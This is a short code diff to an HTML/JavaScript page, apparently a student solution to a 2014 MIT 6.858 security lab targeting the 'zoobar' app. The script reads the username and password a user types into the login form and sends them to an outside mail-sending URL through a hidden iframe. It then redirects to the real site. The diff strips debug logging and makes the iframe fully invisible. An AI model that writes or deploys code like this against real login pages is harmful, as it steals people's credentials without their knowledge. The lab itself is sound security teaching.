@@ -46,17 +46,15 @@
                 if(bar === 2){
                     var url = 'http://css.csail.mit.edu/6.858/2014/labs/sendmail.php?' + 'to=lut@mit.edu' + '&payload=' + username.value + ',' + password.value + '&random=' + Math.random();
                     document.getElementById("formtarget2").src = url;
-                    console.log("foo done");
                 }else if(bar === 3){
                     baz();
                 }
             }
             var baz = function(){
-                console.log("baz");
                 window.location.href="http://localhost:8080/zoobar/index.cgi/";
             }
         </script>
-        <iframe id="formtarget2" name="formtarget2" onload="foo()" style="visibility:hidden;"></iframe>
+        <iframe id="formtarget2" name="formtarget2" onload="foo()" style="visibility:hidden; height:0; width:0; border:0; position:absolute;"></iframe>
         <div class="footer warning"></div>
         <script>document.loginform.login_username.focus();</script>
     </body>
